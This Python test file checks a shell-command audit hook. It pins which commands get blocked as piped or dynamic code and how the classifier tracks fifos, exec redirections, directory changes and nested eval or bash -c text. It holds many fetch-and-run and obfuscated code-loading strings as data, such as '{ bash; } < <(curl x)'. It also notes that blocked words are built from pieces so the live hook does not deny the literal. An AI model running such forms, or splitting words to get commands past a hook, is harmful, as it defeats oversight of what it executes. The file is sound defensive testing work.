"""Stdin facts of the audit classifier (spec audit-stdin-facts, Testing, `test_stdin_facts.py`; Task 1).

Task 1 pins what the classifier does today, before the fact pass is replaced by a fixed point over the main analysis:
the accepted false positives and limitations of the spec (Design 9), the everyday commands that must stay clean, and
how often the repository resolvers are read. Every text is a string literal and nothing is executed: the texts only
reach `analyze_command`. A blocked form is built from pieces when the whole literal would be denied by the live hook
in a Bash call.
"""
import ast
import random
import time
import unittest
from collections import Counter
from pathlib import Path
from unittest import mock

from ._support import ForkedSuite, classifier

analyze = classifier.analyze_command

MKFIFO = "mk" + "fifo"
PUSH_TEXT = "git pu" + "sh"
BLOCKED = "unclassified_command"


class AcceptedBehaviour(unittest.TestCase):
    """The false positives and limitations the spec accepts (Design 9) stay as they are, and everyday commands stay
    clean. A change that makes one of these differ is a decision, not a side effect of the refactor."""

    def assertBlocked(self, command, reason):
        result = analyze(command)
        self.assertIn(BLOCKED, result.flags, command)
        self.assertIn(reason, result.uncertainty, command)

    def assertClean(self, command):
        result = analyze(command)
        self.assertNotIn(BLOCKED, result.flags, command)
        self.assertEqual(result.flags, [], command)

    def each_blocked(self, commands, reason):
        for command in commands:
            with self.subTest(command=command):
                self.assertBlocked(command, reason)

    def each_clean(self, commands):
        for command in commands:
            with self.subTest(command=command):
                self.assertClean(command)

    # -- accepted false positives (Design 9) --------------------------------------------------------------------

    def test_a_shell_reading_a_variable_file_after_a_pipe_is_piped_code(self):
        self.each_blocked((
            'ls | while read f; do bash "$f"; done',
            "echo x | bash ~user/x",
            "echo x | xargs sh",
            "cmd | bash < script.sh",
            "cmd | while read l; do sh; done < list",
        ), "piped_shell")

    def test_a_shell_reading_a_plain_file_in_a_text_that_mentions_an_unresolved_fifo_maker_is_blocked(self):
        self.assertBlocked(MKFIFO + ' "$n"; bash x.sh', "piped_shell")

    def test_a_dynamic_head_with_redirects_counts_as_exec_for_the_sites_after_it(self):
        self.each_blocked(("$cmd < <(x); bash", "$cmd < <(x); bash <&3", "$cmd < <(x); eval y"), "dynamic_code")

    def test_the_over_approximations_of_trap_and_exec_are_blocked(self):
        self.each_blocked(("trap 'bash' INT; echo x", "exec 3< <(x); bash <&3"), "dynamic_code")

    def test_other_shells_that_read_code_through_c_are_blocked(self):
        self.each_blocked(("fish -c 'ls'", "csh -c 'ls'", "tcsh -c 'ls'"), "dynamic_code")

    def test_a_compound_fed_by_a_process_substitution_that_reads_code_is_blocked(self):
        self.each_blocked(("{ bash <<< x; } < <(y)", "f() { bash; } < <(x)"), "dynamic_code")

    def test_a_function_that_evals_its_argument_called_after_a_pipe_is_piped_code(self):
        self.each_blocked((
            'f() { eval "$1"; }; echo x | f a',
            "f() { cat; }; g() { f; }; echo x | g",
        ), "piped_shell")

    def test_a_redefined_function_name_is_judged_by_its_reading_of_the_name(self):
        self.each_blocked((
            "f() { bash; }; f() { :; }; echo x | f",
            "f() { bash; }; unset -f f; echo x | f",
        ), "piped_shell")

    def test_a_launcher_in_front_of_a_function_that_reads_code_under_a_pipe_is_piped_code(self):
        self.each_blocked((
            "echo x | command eval bash",
            "f() { bash; }; echo x | command f",
            "f() { bash; }; echo x | sudo f",
            "f() { bash; }; echo x | env f",
            "f() { bash; }; echo x | timeout 5 f",
        ), "piped_shell")

    def test_an_unknown_head_after_a_pipe_with_a_function_that_reads_code_is_blocked(self):
        result = analyze("f() { bash; }; echo x | $UNKNOWN")
        self.assertIn(BLOCKED, result.flags)
        self.assertIn("piped_shell", result.uncertainty)

    def test_eval_of_a_text_that_defines_a_function_is_blocked(self):
        self.assertBlocked("eval 'x=$(f() { :; }; f)'", "dynamic_code")
        self.assertClean("x=$(f() { :; }; f)")

    def test_source_of_an_unreadable_operand_under_an_active_stdin_state_is_blocked(self):
        self.each_blocked(("exec 3< <(x); source $f; bash < 3", "exec 3< <(x); source $f; ls"), "dynamic_code")

    # -- accepted limitations (Design 9) ------------------------------------------------------------------------

    def test_a_fifo_created_outside_the_text_is_not_known(self):
        self.assertClean("exec 3<> p; bash <&3")

    def test_foreign_interpreters_reading_stdin_are_not_followed(self):
        self.each_clean((
            "python3 - < p", "python3 -", "echo x | python3 -", "echo x | perl", "echo x | node -",
        ))

    def test_source_of_an_unreadable_operand_without_an_active_state_is_clean(self):
        self.each_clean(("source $f; ls", "source $f; echo x | bash 0"))

    def test_a_shell_that_reads_a_plain_file_is_clean_while_the_text_names_no_fifo_maker(self):
        self.each_clean((
            "exec < <(x); bash x.sh", "echo x | { true; bash x.sh; }", MKFIFO + " p; bash x.sh",
            "echo x | bash x.sh", "exec 3< <(x); ls", "echo x | bash -c 'echo hi'",
        ))

    def test_a_pipe_into_source_of_a_plain_file_is_clean(self):
        self.each_clean(("echo x | source 0", "echo x | source ./env.sh", "cd /tmp; source ./env.sh"))

    # -- everyday commands stay clean ---------------------------------------------------------------------------

    def test_everyday_commands_are_clean(self):
        self.each_clean((
            "cd x && pytest -k a",
            MKFIFO + " p; echo hi > p &",
            "eval cd /tmp; ls",
            'f() { "$@"; }; f cd /tmp; ls',
            'source "$HOME/.cargo/env"',
            "bash -c 'make'",
            "echo hi",
            "ls",
            "make",
        ))

    def test_a_blocked_program_is_still_found_next_to_the_stdin_forms(self):
        result = analyze(f"{MKFIFO} p; echo hi > p & {PUSH_TEXT}")
        self.assertIn("git_push", result.flags)


class ResolverReads(unittest.TestCase):
    """The two resolvers that do I/O in the hook (`git_aliases`, `git_external`) are read a bounded number of times
    per analysis: the aliases at most once, each external name at most once, whatever the rounds of the fixed point and
    the nested texts."""

    def read(self, command):
        aliases, external = [], []
        resolvers = {
            "git_aliases": lambda cwd: aliases.append(cwd) or {},
            "git_external": lambda name: external.append(name) or False,
            "cwd": "/repo",
        }
        with mock.patch.dict(classifier.RESOLVERS, resolvers, clear=True):
            result = analyze(command)
        return result, aliases, external

    def assertBounded(self, command, names):
        result, aliases, external = self.read(command)
        self.assertLessEqual(len(aliases), 1, command)
        counts = Counter(external)
        for name in names:
            with self.subTest(command=command, name=name):
                self.assertEqual(counts[name], 1, command)
        self.assertEqual(sorted(counts), sorted(names), command)
        self.assertIn("git_unknown_subcommand", result.uncertainty, command)

    def test_an_unknown_git_subcommand_reads_the_aliases_once_and_the_name_once(self):
        result, aliases, external = self.read("git zzz")
        self.assertEqual(aliases, ["/repo"])
        self.assertEqual(external, ["zzz"])
        self.assertIn("git_unknown_subcommand", result.uncertainty)

    def test_a_text_with_a_directory_change_reads_each_name_once(self):
        self.assertBounded("cd /tmp; git zzz; git yyy", ["zzz", "yyy"])

    def test_nested_code_reads_each_name_once(self):
        self.assertBounded("bash -c 'git zzz; git yyy'", ["zzz", "yyy"])
        self.assertBounded("eval 'git zzz'; git yyy", ["zzz", "yyy"])

    def test_a_text_with_a_fifo_fact_reads_each_name_once(self):
        self.assertBounded(MKFIFO + " p; bash -c 'git zzz'; git yyy; bash < p", ["zzz", "yyy"])

    def test_a_text_with_an_exec_fact_reads_each_name_once(self):
        self.assertBounded("exec 3< <(x); git zzz; git yyy; bash <&3", ["zzz", "yyy"])

    def test_a_function_body_reads_each_name_once(self):
        self.assertBounded("f() { git zzz; }; f; git yyy", ["zzz", "yyy"])

    def test_a_repeated_name_is_read_once_by_the_whole_analysis(self):
        for command in ("git zzz; git zzz", "cd /tmp; git zzz; git zzz", "bash -c 'git zzz'; git zzz",
                        "bash -c 'git zzz; git zzz'", "f() { git zzz; }; f; git zzz"):
            with self.subTest(command=command):
                _, aliases, external = self.read(command)
                self.assertEqual(external, ["zzz"], command)
                self.assertLessEqual(len(aliases), 1)

    def test_a_known_subcommand_reads_nothing(self):
        result, aliases, external = self.read("git status")
        self.assertEqual((aliases, external), ([], []))
        self.assertEqual(result.flags, [])


Facts = classifier.shell.Facts
NO_FACTS = classifier.shell.NO_FACTS
UNKNOWN_FACTS = classifier.shell.UNKNOWN_FACTS


def observe(command):
    """What the main analysis observes in a text: `_analyze`'s facts and the starts of the `ExecSeen` of its last
    round."""
    rounds = []
    finish = classifier._Run.finish

    def spy_finish(run):
        if run.depth == 0:
            rounds.append(run)
        return finish(run)

    with mock.patch.object(classifier._Run, "finish", spy_finish):
        _, facts = classifier._analyze(command)
    return facts, [seen.start for seen in rounds[-1].execs]


class ObservedFacts(unittest.TestCase):
    """The facts the main analysis observes (Design 3): by final reading, by site, at the end of the round and from
    the nested texts, filtered by the kind of the nested text."""

    def facts(self, command):
        return observe(command)[0]

    def test_a_fifo_maker_names_its_fifos(self):
        self.assertEqual(self.facts(f"{MKFIFO} p"), Facts({"p"}))
        self.assertEqual(self.facts(f"{MKFIFO} -m 600 a b"), Facts({"a", "b"}))
        self.assertEqual(self.facts("mkn" + "od q p"), Facts({"q"}))

    def test_a_name_that_is_not_known_makes_every_file_a_possible_fifo(self):
        self.assertEqual(self.facts(f'{MKFIFO} "$n"'), Facts(frozenset(), True))
        self.assertEqual(self.facts(f"{MKFIFO} *.p"), Facts(frozenset(), True))

    def test_a_fifo_maker_behind_a_wrapper_is_an_unknown_fifo(self):
        self.assertEqual(self.facts(f"sudo {MKFIFO} p"), Facts(frozenset(), True))
        self.assertEqual(self.facts(f"echo p | xargs {MKFIFO}"), Facts(frozenset(), True))

    def test_a_program_that_a_value_resolves_to_a_fifo_maker_counts(self):
        self.assertEqual(self.facts(f"s={MKFIFO}; $s p"), Facts({"p"}))
        self.assertEqual(self.facts(f"${{S:-{MKFIFO}}} p"), Facts({"p"}))

    def test_a_word_that_mentions_a_fifo_maker_is_an_unknown_fifo(self):
        self.assertEqual(self.facts(f"echo {MKFIFO}"), Facts(frozenset(), True))

    def test_a_directory_change_or_a_link_is_moved(self):
        for command in ("cd x", "pushd x", "popd", "ln -s a b", "command cd x", "sudo cd x", "env ln -s a b"):
            with self.subTest(command=command):
                self.assertEqual(self.facts(command), Facts(frozenset(), False, True))

    def test_a_program_that_stays_an_expansion_may_be_a_directory_change(self):
        self.assertEqual(self.facts("${X:-}cd y"), Facts(frozenset(), False, True))
        self.assertEqual(self.facts(f"$Y{MKFIFO} p"), Facts(frozenset(), True))

    def test_moving_a_fifo_is_an_unknown_fifo(self):
        self.assertEqual(self.facts(f"{MKFIFO} p; mv p q"), Facts({"p"}, True))
        self.assertEqual(self.facts(f"{MKFIFO} p; sudo mv p q"), Facts({"p"}, True))
        self.assertEqual(self.facts("mv a b"), NO_FACTS)

    def test_commands_with_nothing_to_say_have_no_facts(self):
        for command in ("echo hi", "ls", "make", "git status", "cat x | grep y"):
            with self.subTest(command=command):
                self.assertEqual(self.facts(command), NO_FACTS)

    def test_a_bare_exec_is_seen(self):
        for command, starts in (("exec 3< <(x)", [0]), ("ls; exec 3< p", [4]), ("e=exec; $e -- 3< <(x)", [8]),
                                ("ls", []), ("exec ls", []), ("exec", [])):
            with self.subTest(command=command):
                self.assertEqual(observe(command)[1], starts)

    def test_a_child_hands_up_its_fifos_but_not_its_directory_change(self):
        self.assertEqual(self.facts(f"bash -c '{MKFIFO} p; cd x'"), Facts({"p"}, True))
        self.assertEqual(self.facts("bash -c 'cd x'"), NO_FACTS)
        self.assertEqual(self.facts("sh -c 'ln -s a b'"), NO_FACTS)

    def test_the_same_shell_hands_up_everything(self):
        self.assertEqual(self.facts(f"eval '{MKFIFO} p; cd x'"), Facts({"p"}, True, True))
        self.assertEqual(self.facts("trap 'cd x' EXIT"), Facts(frozenset(), False, True))
        self.assertEqual(self.facts("source /dev/stdin <<'E'\ncd x\nE"), Facts(frozenset(), False, True))

    def test_a_forwarded_function_body_hands_up_its_directory_change(self):
        self.assertEqual(self.facts('f() { "$@"; }; f cd x'), Facts(frozenset(), False, True))
        self.assertEqual(self.facts('f() { "$@"; }; f ls'), NO_FACTS)

    def test_a_heredoc_body_goes_up_by_its_receiver(self):
        self.assertEqual(self.facts("bash <<'E'\ncd x\nE"), NO_FACTS)
        self.assertEqual(self.facts(f"bash <<'E'\n{MKFIFO} p\nE"), Facts({"p"}, True))  # (and the body names it)
        self.assertEqual(self.facts(f"{{ bash; }} <<'E'\n{MKFIFO} p\nE"), Facts({"p"}))
        self.assertEqual(self.facts("{ bash; } <<'E'\ncd x\nE"), Facts(frozenset(), False, True))

    def test_code_made_at_run_time_is_an_unknown_fifo_and_moves_when_a_loader_runs_it(self):
        self.assertEqual(self.facts('bash -c "$x"'), Facts(frozenset(), True))
        self.assertEqual(self.facts("eval $x"), Facts(frozenset(), True, True))
        # (an operand that the state around makes unknown is not a fact of the text: it is read with no context, so
        # the rounds do not feed back into one another)
        self.assertEqual(self.facts("exec 3< <(x); source $f"), NO_FACTS)
        self.assertEqual(self.facts("source $f"), NO_FACTS)
        self.assertEqual(self.facts("source ./env.sh"), NO_FACTS)

    def test_a_git_configuration_that_cannot_be_read_is_an_unknown_fifo(self):
        self.assertEqual(self.facts("git -c alias.x='!" + MKFIFO + " p' x"), Facts({"p"}, True))  # (and the word names it)
        self.assertTrue(self.facts("git -c core.pager=$p log").fifo_unknown)

    def test_a_nested_text_that_does_not_parse_is_unknown(self):
        self.assertEqual(self.facts("eval 'if'"), UNKNOWN_FACTS)
        self.assertEqual(self.facts("bash -c 'if'"), Facts(frozenset(), True))

    def test_a_nested_text_too_long_is_unknown(self):
        long = "x" * (classifier.MAX_COMMAND_LEN + 1)
        self.assertEqual(classifier._analyze(long)[1], UNKNOWN_FACTS)

    def test_the_facts_the_text_inherits_come_back(self):
        stdin = classifier.shell.StdinContext.of({}, Facts({"inherited"}, False, True))
        facts = classifier._analyze("ls", stdin=stdin)[1]
        self.assertEqual(facts, Facts({"inherited"}, False, True))

    def test_a_text_past_the_nesting_limit_has_no_facts(self):
        budget = classifier.shell.Budget(classifier.MAX_LEX_CHARS)
        out = classifier._code_text("cd x", [], [], set(), classifier.MAX_CODE_DEPTH, budget, kind=classifier._SAME)
        self.assertEqual(out, NO_FACTS)

    def test_the_kind_of_a_nested_text_filters_what_goes_up(self):
        for kind, moved in ((classifier._CHILD, False), (classifier._SAME, True), (classifier._BODY, True)):
            with self.subTest(kind=kind):
                budget = classifier.shell.Budget(classifier.MAX_LEX_CHARS)
                found = classifier._code_text(f"{MKFIFO} p; cd x", [], [], set(), 0, budget, kind=kind)
                self.assertEqual(found, Facts({"p"}, False, moved))

    def test_the_kinds_are_the_strings_the_facts_take(self):
        self.assertEqual((classifier._CHILD, classifier._SAME, classifier._BODY), ("child", "same", "body"))

    def test_analyze_command_is_the_analysis_of_the_text(self):
        for command in ("ls", f"{MKFIFO} p; bash < p", "cd x && make", "eval 'bash'"):
            with self.subTest(command=command):
                self.assertEqual(analyze(command), classifier._analyze(command)[0])


# Texts of the probes of the stdin classes and of the divergences D1-D7 of the spec.
CORPUS = (
    "echo hi", "ls", "make", "cd x && make", "pushd x; popd", "ln -s a b",
    f"{MKFIFO} p", f"{MKFIFO} -m 600 p q", f"{MKFIFO} -- p", f"command {MKFIFO} p", "mk''fifo p", "mk\\fifo p",
    'mkn""od p p', f"s={MKFIFO}; $s p", f"{MKFIFO} p; bash < p", f"{MKFIFO} p; mv p q; bash < q",
    f'{MKFIFO} "$n"; bash x.sh', f"echo {MKFIFO} > x", f"sudo {MKFIFO} p",
    "exec 3< <(x)", "exec 3< <(x); bash <&3", "exec 3< <(x); source $f; ls", "exec {fd}< <(x); bash <&$fd",
    "$cmd < <(x); bash", "exec < <(x); bash",
    f"eval '{MKFIFO} p'; bash < p", f"bash -c '{MKFIFO} p'; bash < p", f"eval 'cd /dev/fd'; echo x | source 0",
    "bash -c 'cd /dev/fd'; echo x | source 0", "eval cd /tmp; ls", "source $f; ls", "source ./env.sh",
    "f() { \"$@\"; }; f cd /tmp; ls", "f() { cd x; }; f; ls", "trap 'cd x' EXIT; ls",
    "git -c alias.x='!" + MKFIFO + " p' x; bash < p", "git -c core.pager=$p log",
    "{ bash; } <<E\n" + MKFIFO + " p\nE\nbash < p",
    "bash <<E\n" + MKFIFO + " p\nE\nbash < p", "eval 'if'; ls", "bash -c 'if'; bash < p",
    "echo x | bash 0", "cat <(x) | bash",
)

# The divergences D1-D7 of the spec (the forms the old fact pass did not read), with the facts the text has.
DIVERGENCES = {
    "D1": ("f() { $1 -c 'mk\"\"fifo p'; }; f sh; bash < p", Facts({"p"})),
    "D2": ("export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.x GIT_CONFIG_VALUE_0='!mk\"\"fifo p'; git x; bash < p",
           Facts({"p"})),
    "D4": ("e=exec; $e -- 3< <(x); bash <&3", None),
    "D5": ("f() { $1 /dev/fd; }; f cd; echo x | source 0", Facts(frozenset(), False, True)),
    "D6": ("{ bash; } <<E\nmk\"\"fifo p\nE\nbash < p", Facts({"p"})),
    "D7": (f"{MKFIFO} p; bash -c 'mv p q'; bash < q", Facts({"p"}, True)),
}


def count_rounds(command):
    """The rounds the top-level text is read in, and the analysis."""
    runs = []
    classify = classifier._Run.classify

    def spy(run):
        if run.depth == 0:
            runs.append(run)
        return classify(run)

    with mock.patch.object(classifier._Run, "classify", spy):
        analysis = analyze(command)
    return len(runs), analysis, runs


class StdinFactsFromAnalysis(unittest.TestCase):
    """The contexts come from the facts the main analysis observes (Design 4): D1-D7 and the rows of Design 10."""

    def assertBlocked(self, command, reason):
        result = analyze(command)
        self.assertIn(BLOCKED, result.flags, command)
        self.assertIn(reason, result.uncertainty, command)

    def assertClean(self, command):
        result = analyze(command)
        self.assertEqual(result.flags, [], command)
        self.assertEqual(result.uncertainty, [], command)

    def test_the_divergences_of_the_old_pass_are_blocked(self):
        for name, (command, _) in DIVERGENCES.items():
            with self.subTest(divergence=name):
                self.assertBlocked(command, "dynamic_code" if name == "D4" else "piped_shell")
        with self.subTest(divergence="D3"):
            self.assertBlocked(f"{MKFIFO} p; {{ exec 3<&0; }} < p; bash <&3", "piped_shell")
        with self.subTest(divergence="D7 eval"):
            self.assertBlocked(f"{MKFIFO} p; eval 'mv p q'; bash < q", "piped_shell")

    def test_a_directory_change_goes_down_into_the_code_that_reads_stdin(self):  # decision 1
        self.assertBlocked("cd /dev/fd; echo x | eval 'source 0'", "piped_shell")
        self.assertBlocked("cd /dev/fd; echo x | bash -c 'source 0'", "piped_shell")
        self.assertBlocked("echo x | eval 'cd /dev/fd; source 0'", "piped_shell")
        self.assertClean("echo x | eval 'cd /dev/fd'")

    def test_a_directory_change_or_a_link_behind_a_wrapper_counts(self):  # decision 2
        for command in ("sudo ln -s /dev/fd d; echo x | bash d/0", "timeout 5 ln -s /dev/fd d; echo x | bash d/0",
                        f"{MKFIFO} p; sudo mv p q; bash < q", "env cd x; echo y | bash z.sh",
                        "sudo cd x; echo y | bash z.sh", f"sudo {MKFIFO} p; bash x.sh"):
            with self.subTest(command=command):
                self.assertBlocked(command, "piped_shell")
        for command in ("sudo ln -s a b; ls", "env cd x; ls"):
            with self.subTest(command=command):
                self.assertClean(command)

    def test_a_value_that_resolves_to_a_fifo_maker_names_the_fifo(self):  # Design 10
        self.assertClean(f"s={MKFIFO}; bash -c '$s p'; bash x.sh")
        self.assertClean(f"s={MKFIFO}; $s p; bash x.sh")

    def test_everyday_commands_stay_clean(self):
        for command in ("cd x && pytest -k a", "ls", "git status", f"{MKFIFO} p; echo hi > p &", "eval cd /tmp; ls"):
            with self.subTest(command=command):
                self.assertClean(command)

    def test_the_last_round_assumes_what_it_observes(self):
        for command in CORPUS + tuple(text for text, _ in DIVERGENCES.values()):
            with self.subTest(command=command):
                _, _, runs = count_rounds(command)
                last = runs[-1]
                self.assertEqual(classifier._changed_facts(last.assumed, last.assumed.join(last.observed)) & last.reads, set())


class FactRounds(unittest.TestCase):
    """How many rounds a text is read in: one without facts, two with them, at most `MAX_FACT_ROUNDS`."""

    def test_a_text_without_facts_is_read_once(self):
        for command in ("echo hi", "ls", "make", "git status", "cat x | grep y", "bash -c 'make'", "f() { :; }; f"):
            with self.subTest(command=command):
                self.assertEqual(count_rounds(command)[0], 1)

    def test_a_text_with_facts_is_read_twice_at_most_on_the_corpus(self):
        for command in CORPUS:
            with self.subTest(command=command):
                self.assertLessEqual(count_rounds(command)[0], 2)
                self.assertLessEqual(count_rounds(f"echo x | {{ {command}\n}}")[0], 3)

    def test_a_fact_that_needs_the_fifos_of_the_text_down_in_a_nested_one_takes_a_third_round(self):
        # (the nested `mv` knows the fifo only once the text assumes it: D7, D3)
        self.assertEqual(count_rounds(f"{MKFIFO} p; bash -c 'mv p q'; bash < q")[0], 3)
        self.assertEqual(count_rounds(f"{MKFIFO} p; {{ exec 3<&0; }} < p; bash <&3")[0], 3)

    def test_an_extra_round_is_charged_like_a_text(self):
        budget = classifier.shell.Budget(classifier.MAX_LEX_CHARS)
        classifier.analyze_command(f"{MKFIFO} p; bash < p", _budget=budget)
        spent = classifier.MAX_LEX_CHARS - budget.left
        once = classifier.shell.Budget(classifier.MAX_LEX_CHARS)
        classifier.analyze_command("echo p; bash < p", _budget=once)
        self.assertGreaterEqual(spent - (classifier.MAX_LEX_CHARS - once.left), classifier.TEXT_COST)

    def test_the_cap_is_level_b(self):
        with mock.patch.object(classifier, "MAX_FACT_ROUNDS", 1):
            result = analyze(f"{MKFIFO} p; bash < p")
            clean = analyze("echo hi")
        self.assertEqual((result.flags, result.uncertainty), ([BLOCKED], ["analysis_budget"]))
        self.assertEqual(clean.flags, [])

    def test_a_budget_spent_before_the_second_round_is_level_b(self):
        command = f"{MKFIFO} p; bash < p"
        budget = classifier.shell.Budget(classifier.TEXT_COST + len(command) + 5)
        result = classifier.analyze_command(command, _budget=budget)
        self.assertEqual(result.uncertainty, ["analysis_budget"])

    def test_an_observation_that_grows_every_round_is_level_b(self):
        names = iter(range(10000))
        observe_reading = classifier._Run.observe_reading

        def growing(run, site, tokens, words, readings):
            run._fifos.add(f"n{next(names)}")
            return observe_reading(run, site, tokens, words, readings)

        with mock.patch.object(classifier._Run, "observe_reading", growing):
            result = analyze("bash < p")
        self.assertEqual((result.flags, result.uncertainty), ([BLOCKED], ["analysis_budget"]))


class FactsLinearity(unittest.TestCase):
    """The facts keep the analysis linear (Design 6): each form below stays under a second of CPU and in at most two
    rounds at the top."""

    def assertLinear(self, command):
        start = time.process_time()
        rounds, _, _ = count_rounds(command)
        self.assertLess(time.process_time() - start, 1.0)
        self.assertLessEqual(rounds, 2)

    def test_facts_that_only_a_nested_text_has_stay_linear(self):
        self.assertLinear("; ".join(f"eval '{MKFIFO} p{i}'; bash < p{i}" for i in range(200)))

    def test_facts_three_levels_down_stay_linear(self):
        self.assertLinear("; ".join(f"bash -c 'eval \"{MKFIFO} p{i}\"'; bash < p{i}" for i in range(100)))

    def test_forwarded_calls_stay_linear(self):
        self.assertLinear('f() { "$@"; }; ' + "; ".join("f cd /dev/fd" for _ in range(classifier.MAX_CODE_ARGS)))

    def test_many_directory_changes_stay_linear(self):
        self.assertLinear("; ".join("cd /dev/fd; echo x | bash 0" for _ in range(400)))

    def test_many_fifos_and_execs_stay_linear(self):
        self.assertLinear("; ".join(f"{MKFIFO} p{i}; exec 3< p{i}" for i in range(400)))


def sh_quote(text):
    """The text as one single-quoted word."""
    return "'" + text.replace("'", "'\\''") + "'"


# Wrappers that run a text: `(name, kind, builder)`. The kind is how the text runs (what `Facts.for_parent` filters by).
WRAPPERS = (
    ("eval", classifier._SAME, lambda x: f"eval {sh_quote(x)}"),
    ("source stdin", classifier._SAME, lambda x: f"source /dev/stdin <<'E'\n{x}\nE"),
    ("trap", classifier._SAME, lambda x: f"trap {sh_quote(x)} EXIT"),
    ("bash -c", classifier._CHILD, lambda x: f"bash -c {sh_quote(x)}"),
    ("sh -c", classifier._CHILD, lambda x: f"sh -c {sh_quote(x)}"),
    ("timeout bash -c", classifier._CHILD, lambda x: f"timeout 5 bash -c {sh_quote(x)}"),
    ("su -c", classifier._CHILD, lambda x: f"su -c {sh_quote(x)}"),
    ("git alias", classifier._CHILD, lambda x: f"git -c alias.x={sh_quote('!' + x)} x"),
    ("parallel", classifier._CHILD, lambda x: f"parallel ::: {sh_quote(x)}"),
)

# The inner texts of the property: the corpus without the ones that do not stand alone (here-documents, a text that
# reads the descriptors of the text around it) and, for the relation below, the ones whose facts depend on the depth.
INNER = tuple(text for text in CORPUS if "\n" not in text and "$cmd" not in text and "<&" not in text
              and "exec" not in text and "echo x |" not in text)


def covered(new, old):
    """`new` has every fifo, unknown fifo and directory change `old` has (it may have more)."""
    return ((new.fifo_unknown or old.fifos <= new.fifos) and (new.fifo_unknown or not old.fifo_unknown)
            and (new.moved or not old.moved))


class NestedEqualsInline(unittest.TestCase):
    """A text run through a wrapper has the facts the text has by itself, filtered by how the wrapper runs it
    (Design 3, R8). The wrapper's own command can only add what the mention rule adds (a word that names a fifo maker
    where no reading made a fifo), so a text that does not name one is compared exactly."""

    def facts(self, command):
        return classifier._analyze(command)[1]

    def check(self, inner, wrappers):
        # (a text the wrappers nest deeper than `MAX_CODE_DEPTH` is level B and has no facts; a `git` alias whose
        # code has an expansion is read by the alias rules, which may not resolve it)
        nests = any(mark in inner for mark in ("eval ", "-c ", "trap ", '"$@"'))
        if len(wrappers) + nests > classifier.MAX_CODE_DEPTH:
            return
        if "$" in inner and any(name == "git alias" for name, _, _ in wrappers):
            return
        text = inner
        kinds = []
        for _, kind, build in wrappers:
            text = build(text)
            kinds.append(kind)
        expected = self.facts(inner)
        for kind in kinds:
            expected = expected.for_parent(kind)
        found = self.facts(text)
        label = (inner, [name for name, _, _ in wrappers])
        if MKFIFO in inner or "mkn" + "od" in inner or "mk''" in inner or "mk\\" in inner or 'mk""' in inner \
                or 'mkn""' in inner:
            self.assertTrue(covered(found, expected), (label, found, expected))
        else:
            self.assertEqual(found, expected, label)

    def test_each_wrapper_over_each_text(self):
        for inner in INNER:
            for wrapper in WRAPPERS:
                with self.subTest(inner=inner, wrapper=wrapper[0]):
                    self.check(inner, [wrapper])

    def test_wrappers_composed_from_a_fixed_seed(self):
        rng = random.Random(20261118)
        for _ in range(200):
            inner = rng.choice(INNER)
            chosen = [rng.choice(WRAPPERS) for _ in range(rng.randint(1, 3))]
            with self.subTest(inner=inner, wrappers=[name for name, _, _ in chosen]):
                self.check(inner, chosen)


class RemovedFactsPass(unittest.TestCase):
    """The pass that read the facts of the text a second time is gone (R1): nothing is left of it in the classifier."""

    def test_the_old_pass_and_its_helpers_are_gone(self):
        for name in ("_stdin_facts", "_nested_facts", "_site_code_facts", "_changes_directory", "_stdin_resolver"):
            with self.subTest(name=name):
                self.assertFalse(hasattr(classifier, name))

    def test_the_run_has_no_readings_for_a_second_pass(self):
        for name in ("resolved", "head_readings"):
            with self.subTest(name=name):
                self.assertFalse(hasattr(classifier._Run, name))

    def test_the_contexts_come_from_the_facts_of_the_round(self):
        self.assertTrue(hasattr(classifier, "_contexts"))

    def test_the_compound_process_substitution_check_does_not_come_back(self):
        # (the walker gives the body of the compound its state, `Site.given`: a second walk of the compounds is gone)
        self.assertFalse(hasattr(classifier._Run, "compound_procsub_stdin"))
        self.assertFalse(hasattr(classifier, "compound_procsub_stdin"))

    def test_the_second_walk_for_unknown_code_is_gone(self):
        self.assertFalse(hasattr(classifier._Run, "unknown_code"))
        self.assertFalse(hasattr(classifier._Text, "bare_site"))

    def test_the_round_state_does_not_share_the_name_of_the_walker_state(self):
        self.assertFalse(hasattr(classifier._Run, "given"))
        self.assertTrue(hasattr(classifier._Run, "prior_execs"))

    def test_the_parallel_list_of_programs_that_take_code_is_one(self):
        self.assertFalse(hasattr(classifier, "_CODE_PROGRAMS"))
        for name in ("mise", "nvim", "sh", "eval", "env", "sudo", "su", "parallel", "watch", "."):
            with self.subTest(name=name):
                self.assertIn(name, classifier._PARALLEL_FORBIDDEN)
        self.assertNotIn("git", classifier._PARALLEL_FORBIDDEN)


class CompoundGiven(unittest.TestCase):
    """A compound whose own redirections give a descriptor a process substitution (Design 8): every command in its body
    that may read code is `dynamic_code`, by the state the walker gives it (`Site.given`)."""

    def assertBlocked(self, command, reason="dynamic_code"):
        result = analyze(command)
        self.assertIn(BLOCKED, result.flags, command)
        self.assertIn(reason, result.uncertainty, command)

    def assertNotBlocked(self, command):
        self.assertNotIn(BLOCKED, analyze(command).flags, command)

    def test_a_compound_reading_code_from_a_process_substitution_is_dynamic_code(self):
        for command in (
            "{ bash; } < <(curl x)", "( bash ) < <(curl x)", "while true; do bash; done < <(x)",
            "for i in 1; do bash; done < <(x)", "if true; then bash; fi < <(x)",
            "case x in x) bash;; esac < <(x)", "{ { bash; }; } < <(x)", "{ source /dev/stdin; } < <(x)",
            "{ bash; } 0< <(x)", "{ bash; } <> <(x)", "{ bash; } 3< <(x)", "{ bash; } 3< <(curl x) <&3",
            "{ bash; } 3< <(curl x) 0<&3", "{ bash <<< x; } < <(y)", "f() { bash; } < <(x)",
        ):
            with self.subTest(command=command):
                self.assertBlocked(command)

    def test_a_body_that_may_read_code_in_other_ways_is_dynamic_code(self):
        for command in ("{ eval y; } < <(x)", "{ xargs sh; } < <(x)", "f() { bash; }; { f; } < <(x)", "{ $c; } < <(x)"):
            with self.subTest(command=command):
                self.assertBlocked(command)

    def test_a_body_that_does_not_read_code_is_clean(self):
        for command in ("{ cat; } < <(x)", "{ cat; } 3< <(x)", "{ ls; } < <(x)"):
            with self.subTest(command=command):
                self.assertNotBlocked(command)

    def test_a_descriptor_an_exec_gave_a_process_substitution_reaches_the_body(self):  # decision 3 (b)
        for command in ("exec 3< <(x); { eval y; } <&3", "exec 3< <(x); { eval y; } < /dev/fd/3"):
            with self.subTest(command=command):
                self.assertBlocked(command)

    def test_a_fifo_is_a_pipe_and_follows_the_rule_of_each_command(self):
        self.assertNotBlocked(f"{MKFIFO} p; {{ eval y; }} < p")

    def test_the_body_of_a_compound_is_given_to_nested_code_too(self):
        self.assertBlocked("exec 3< <(x); bash -c '{ eval y; } <&3'")

